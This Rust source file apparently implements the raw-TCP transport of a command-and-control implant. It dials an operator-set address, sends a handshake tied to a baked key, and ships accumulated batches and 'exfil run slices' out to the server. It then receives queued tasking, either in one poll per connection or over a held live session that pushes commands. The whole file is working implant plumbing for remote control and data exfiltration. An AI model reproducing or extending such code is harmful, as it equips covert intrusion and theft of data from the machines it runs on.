use std::io::{Read, Write};
use std::net::TcpStream;
use std::time::Duration;

use super::live::{self, LiveChannel};
use super::Contact;
use crate::error::ContactError;
use crate::profile::Profile;
use crate::session::{Attempt, Session};
use crate::wire::Frame;

// The raw-TCP carriage (architecture.md Sec 8, the socket family): the same
// contact flow the envelope POST cycle runs, over a bare TCP connection
// speaking the self-delimited message shape -- a varint byte length, then
// that many body bytes, where the body is exactly what the envelope route
// carries (the sealed contact shape or the plaintext framed frames). The
// certificate-less posture: no TLS dial, the identity is the handshake id
// and the baked seal, and enrollment rides the socket's opening exchange.
//
// The bake's mode picks the client: a poll build opens one connection per
// cycle -- the request message carries the handshake and the batch, the
// response message carries the answer, staged answers, tasking, and the
// degraded channel input -- and closes; a stream build advertises the live
// capability and holds the connection, the server pushing tasking the
// moment it queues (the same session runner the WebSocket beacon runs, and
// the same held-session discipline it runs).

/// The handshake capability that switches a socket connection from the poll
/// exchange to the held live session (the server's LiveSessionCapability).
const LIVE_SESSION_CAPABILITY: &str = "channels.live";

/// One message budget per direction, the envelope's own body cap (the wire
/// contract's sizing rule; nothing larger is legal on any carriage).
const MAX_MESSAGE_BYTES: usize = 8 * 1024 * 1024;

/// How long a message, once started, may take to complete: bounded against
/// a dead peer, generous against a slow one.
const MESSAGE_TIMEOUT: Duration = Duration::from_secs(30);

pub struct RawTcp {
    address: String,
    live: bool,
}

impl RawTcp {
    pub fn new(dial: &str, profile: &Profile) -> RawTcp {
        let rest = dial.strip_prefix("tcp://").unwrap_or(dial);
        let address = rest.split('/').next().unwrap_or(rest).to_string();
        RawTcp {
            address,
            live: profile.mode == "stream",
        }
    }

    fn connect(&self) -> Result<TcpStream, ContactError> {
        let stream = TcpStream::connect(&self.address)
            .map_err(|e| ContactError::Transport(format!("dial {}: {e}", self.address)))?;
        stream.set_nodelay(true).ok();
        Ok(stream)
    }

    /// The poll shape: one connection is one contact. The request message
    /// carries the handshake, the staged demands at their current seams, the
    /// accumulated batch, and the exfil run slices the message budget
    /// admits; the response message carries the handshake answer, the seam
    /// reports for the slices placed, the staged chunk runs answering those
    /// demands, queued tasking, and the degraded channel input. The batch
    /// leaves only after a processed response, so a failed contact re-sends
    /// it verbatim on the next connection -- a staged transfer's held bytes
    /// and an exfil run's confirmed seam survive on the session and resume.
    fn attempt_poll(&mut self, session: &mut Session) -> Result<Attempt, ContactError> {
        let mut stream = self.connect()?;
        session.drain_channels();
        let demands = session.staged_demands();
        let batch = session.outbox.batch();
        let exfil = session.exfil_frames(crate::session::EXFIL_CONTACT_BUDGET);
        let mut frames = Vec::with_capacity(1 + demands.len() + batch.len() + exfil.len());
        frames.push(session.handshake_frame());
        frames.extend(demands);
        frames.extend(batch.iter().cloned());
        frames.extend(exfil);
        let (body, _) = session.encode_outgoing(&frames);
        write_message(&mut stream, &body)?;

        let Some(response) = read_message(&mut stream, false)? else {
            return Err(ContactError::Protocol(
                "the socket closed before the answer",
            ));
        };
        let inbound = session
            .decode_incoming(&response)
            .ok_or(ContactError::Protocol(
                "the contact message did not verify under the baked key",
            ))?;
        let first = inbound.first().ok_or(ContactError::Protocol(
            "the contact response carried no frames",
        ))?;
        let (acks, attempt) = session
            .handshake_answered(first)
            .map_err(ContactError::Protocol)?;
        if let Attempt::Refused = attempt {
            return Ok(attempt);
        }
        session.outbox.batch_crossed(batch.len());
        super::http::accept_staged(session, &inbound);
        super::accept_tasking(session, &inbound[1..], acks);
        session.drain_channels();
        session.staged_cycle_end();
        session.exfil_cycle_end();
        Ok(Attempt::Crossed)
    }

    /// The live shape: the handshake's live advertisement switches the
    /// connection into the held session -- the handshake answer rides as
    /// its own message, then the server pushes tasking the moment it
    /// queues, each frame its own message, until the connection dies and
    /// the run loop's reconnect cadence takes over.
    fn attempt_live(&mut self, session: &mut Session) -> Result<Attempt, ContactError> {
        let mut stream = self.connect()?;
        session.advertise(LIVE_SESSION_CAPABILITY);

        let handshake = [session.handshake_frame()];
        let (body, _) = session.encode_outgoing(&handshake);
        write_message(&mut stream, &body)?;
        let closed = || ContactError::Protocol("the stream closed before the handshake response");
        let Some(inbound) = read_frames(session, &mut stream, false)? else {
            return Err(closed());
        };
        let first = inbound.first().ok_or_else(closed)?;
        let (acks, attempt) = session
            .handshake_answered(first)
            .map_err(ContactError::Protocol)?;
        if let Attempt::Refused = attempt {
            return Ok(attempt);
        }

        let mut channel = SocketLive {
            stream: &mut stream,
            tick: false,
        };
        let outcome = live::held_handshake(session, &mut channel, &inbound[1..], acks);
        // A dead connection ends every channel it carried (the wire
        // contract's session-scoped lifetime); their results never come.
        session.channels.reap();
        outcome.map(|()| Attempt::Crossed)
    }
}

impl Contact for RawTcp {
    fn attempt(&mut self, session: &mut Session) -> Result<Attempt, ContactError> {
        if self.live {
            self.attempt_live(session)
        } else {
            self.attempt_poll(session)
        }
    }
}

/// The held session over the socket's message codec: the byte exchange the
/// shared live discipline runs.
struct SocketLive<'a> {
    stream: &'a mut TcpStream,
    tick: bool,
}

impl LiveChannel for SocketLive<'_> {
    fn send_batch(&mut self, session: &mut Session, frames: &[Frame]) -> Result<(), ContactError> {
        let (body, _) = session.encode_outgoing(frames);
        write_message(self.stream, &body)
    }

    fn recv(&mut self, session: &mut Session) -> Result<Option<Vec<Frame>>, ContactError> {
        read_frames(session, self.stream, self.tick)
    }

    fn arm_tick(&mut self, on: bool) {
        self.tick = on;
    }
}

// --- The message codec (the socket family's StreamContactFraming): one
// self-delimited message per direction -- a varint byte length, then that
// many body bytes.

/// Writes one message: the varint length prefix, the body, and a flush so
/// the peer's read completes without waiting on buffer boundaries.
pub fn write_message(stream: &mut TcpStream, body: &[u8]) -> Result<(), ContactError> {
    let mut prefix = Vec::with_capacity(5);
    let mut value = body.len() as u64;
    while value >= 0x80 {
        prefix.push((value as u8) | 0x80);
        value >>= 7;
    }
    prefix.push(value as u8);
    stream
        .write_all(&prefix)
        .and_then(|()| stream.write_all(body))
        .and_then(|()| stream.flush())
        .map_err(|e| ContactError::Transport(e.to_string()))
}

/// Reads one message under a completion deadline. When `ticks` is set, an
/// idle read (nothing arrived) reports None instead of waiting -- the
/// channel wake; once a byte has arrived the message completes under the
/// bounded deadline, never mid-message desync.
pub fn read_message(stream: &mut TcpStream, ticks: bool) -> Result<Option<Vec<u8>>, ContactError> {
    stream
        .set_read_timeout(if ticks {
            Some(live::CHANNEL_TICK)
        } else {
            Some(MESSAGE_TIMEOUT)
        })
        .map_err(|e| ContactError::Transport(e.to_string()))?;
    let mut byte = [0u8; 1];
    match stream.read(&mut byte) {
        Ok(0) => {
            return Err(ContactError::Protocol(
                "the socket closed under the contact",
            ))
        }
        Ok(_) => {}
        Err(e) if is_read_tick(&e) => return Ok(None),
        Err(e) => return Err(ContactError::Transport(e.to_string())),
    }

    // A message has started: complete it under the bounded deadline.
    stream
        .set_read_timeout(Some(MESSAGE_TIMEOUT))
        .map_err(|e| ContactError::Transport(e.to_string()))?;
    let mut length = byte[0] as u64 & 0x7f;
    let mut shift = 7u32;
    while byte[0] & 0x80 != 0 {
        read_exact(stream, &mut byte)?;
        length |= ((byte[0] as u64) & 0x7f) << shift;
        if shift > 63 {
            return Err(ContactError::Protocol(
                "the message length prefix is a malformed varint",
            ));
        }
        shift += 7;
    }
    if length as usize > MAX_MESSAGE_BYTES {
        return Err(ContactError::Protocol(
            "the contact message exceeds the body budget",
        ));
    }
    let mut body = vec![0u8; length as usize];
    read_exact(stream, &mut body)?;
    Ok(Some(body))
}

/// Reads one message and decodes its body as this run's frames; None on an
/// idle tick (the `ticks` shape).
fn read_frames(
    session: &Session,
    stream: &mut TcpStream,
    ticks: bool,
) -> Result<Option<Vec<Frame>>, ContactError> {
    let Some(body) = read_message(stream, ticks)? else {
        return Ok(None);
    };
    session
        .decode_incoming(&body)
        .map(Some)
        .ok_or(ContactError::Protocol(
            "the contact message did not verify under the baked key",
        ))
}

fn read_exact(stream: &mut TcpStream, buffer: &mut [u8]) -> Result<(), ContactError> {
    stream
        .read_exact(buffer)
        .map_err(|e| ContactError::Transport(e.to_string()))
}

/// Whether a failed read is the read-timeout tick rather than a dead
/// socket.
fn is_read_tick(error: &std::io::Error) -> bool {
    matches!(
        error.kind(),
        std::io::ErrorKind::WouldBlock | std::io::ErrorKind::TimedOut
    )
}
